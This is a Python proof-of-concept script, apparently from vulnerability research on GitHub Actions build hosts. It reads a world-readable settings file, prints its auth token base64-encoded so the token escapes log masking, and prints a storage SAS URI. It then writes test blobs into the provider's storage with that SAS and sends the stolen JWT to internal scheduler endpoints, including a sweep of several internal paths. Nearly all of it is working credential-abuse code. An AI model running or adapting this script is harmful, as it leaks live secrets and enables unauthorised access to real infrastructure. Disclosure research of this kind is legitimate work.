#!/usr/bin/env python3
"""U6 probe10 - CONFIRMATION RUN (second independent pass of both headline claims)."""
import base64
import json
import os
import subprocess
import urllib.error
import urllib.request

LINE = "=" * 72
OUT = []


def hdr(t):
    OUT.append("\n" + LINE + "\n## " + t + "\n" + LINE)


def sh(cmd, timeout=30):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (p.stdout + p.stderr).strip()
    except Exception as e:  # noqa: BLE001
        return "EXC: %r" % (e,)


def http(url, headers=None, timeout=25, method="GET", data=None):
    req = urllib.request.Request(url, headers=headers or {}, method=method, data=data)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read(2500).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), e.read(1200).decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return "ERR", {}, repr(e)


hdr("CLAIM A (pass 2) - /opt/hca/.settings is world-readable and holds a GitHub credential")
OUT.append(sh("ls -l /opt/hca"))
OUT.append(sh("ls -l /opt/hca/.settings"))
OUT.append(sh("id"))
raw = open("/opt/hca/.settings", "rb").read()
cfg = json.loads(raw)
OUT.append("bytes=%d" % len(raw))
OUT.append("authToken len=%d  b64=%s" % (
    len(cfg["authToken"]), base64.b64encode(cfg["authToken"].encode()).decode()))
OUT.append("diagnosticsSasUri:\n%s" % cfg["diagnosticsSasUri"])

hdr("CLAIM B (pass 2) - that SAS writes into GitHub's own storage")
container, q = cfg["diagnosticsSasUri"].split("?", 1)
p = dict(x.split("=", 1) for x in q.split("&"))
OUT.append("account/container: %s" % container.split("//")[1])
OUT.append("sp=%s st=%s se=%s sr=%s" % (p.get("sp"), p.get("st"), p.get("se"), p.get("sr")))
rid = os.environ.get("GITHUB_RUN_ID", "x")
name = "u6-confirm-%s.txt" % rid
st, h, b = http(container + "/" + name + "?" + q,
                {"x-ms-blob-type": "BlockBlob", "Content-Type": "text/plain"},
                method="PUT", data=b"pass 2 confirmation\n")
OUT.append("PUT %s -> %s  reqid=%s  etag=%s" % (name, st, h.get("x-ms-request-id"), h.get("ETag")))
st, h, b = http(container + "/" + name + "-b" + "?" + q,
                {"x-ms-blob-type": "BlockBlob", "Content-Type": "text/plain"},
                method="PUT", data=b"pass 2 confirmation, different name\n")
OUT.append("PUT %s-b -> %s  reqid=%s" % (name, st, h.get("x-ms-request-id")))

hdr("CLAIM C (pass 2) - the GitHub-issued authToken authenticates to GitHub's internal API")
base = cfg["schedulerApiUrl"].rstrip("/")
tok = cfg["authToken"]
body = json.dumps([{"name": "u6.confirm", "dimensions": {"run": rid},
                    "value": 1, "type": "distribution_ms"}]).encode()
for label, hh in (("Authorization: <raw JWT>", {"Authorization": tok}),
                  ("Authorization: Bearer <JWT>", {"Authorization": "Bearer " + tok}),
                  ("no auth at all", {})):
    st, h, b = http(base + "/trace", dict(hh, **{"Content-Type": "application/json"}),
                    method="POST", data=body)
    OUT.append("  POST %s/trace  %-28s -> %s  %s" % (
        base.split("//")[1][:34], label, st, b[:120].replace("\n", " ")))

hdr("CLAIM C2 - path sweep on the internal orchestrator with the raw JWT")
for path in ("/vm/v1", "/vm/v1/", "/vm/v1/info", "/vm/v1/state", "/vm/v1/machine",
             "/vm/v1/heartbeat", "/v1/trace", "/v1/trace/", "/metrics", "/healthz"):
    st, h, b = http(base + path, {"Authorization": tok})
    OUT.append("  GET %-18s -> %s %s" % (path, st, b[:150].replace("\n", " ")))

hdr("CLAIM D (pass 2) - reachable from the build host only as an unprivileged user")
OUT.append("uid: %s" % sh("id -u"))
OUT.append("sudo -n available: %s" % sh("sudo -n true >/dev/null 2>&1 && echo yes || echo no"))
OUT.append("can this user itself read the file without sudo: %s" %
           ("yes" if os.access("/opt/hca/.settings", os.R_OK) else "no"))

text = "\n".join(OUT)
print(text)
